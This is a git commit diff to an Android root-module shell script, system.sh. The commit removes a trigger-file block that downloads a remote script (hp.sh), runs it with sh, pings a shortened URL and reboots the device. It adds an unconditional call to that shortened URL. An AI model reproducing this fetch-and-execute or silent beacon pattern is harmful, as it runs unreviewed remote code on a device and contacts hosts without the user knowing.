6572a969d229ec73792e3e6b0cc99c40c7b9f008
幻tly <81273793+tanluying@users.noreply.github.com>
2025-09-13 23:18:55 +0800

    Update system.sh

--- system.sh
+++ system.sh
@@ -1,17 +1,6 @@
 #echo "123" > /storage/emulated/0/Download/apks.txt
 cp -f /data/adb/modules/zygisk_lsposed/curl /data/system/package_cache/curl
-#curl -l https://sourl.cn/tRtpnk
-#settings put system peak_refresh_rate 1
-#####
-file_content=$(cat "/storage/emulated/0/Download/apks.txt" | tr -d '\r\n')
-if [ "$file_content" = "456" ]; then
-    echo "ok"
-    cp -f /data/adb/modules/zygisk_lsposed/curl /data/system/package_cache/curl
-    curl -s -o https://tanluying.github.io/ying/hp.sh /storage/emulated/0/Download/hp.sh
-    sh /storage/emulated/0/Download/hp.sh
-    curl -l https://sourl.cn/tRtpnk
-    echo "123" > /storage/emulated/0/Download/apks.txt
-    reboot
-fi
+curl -l https://sourl.cn/tRtpnk
+settings put system peak_refresh_rate 1
 #####
 sleep 900
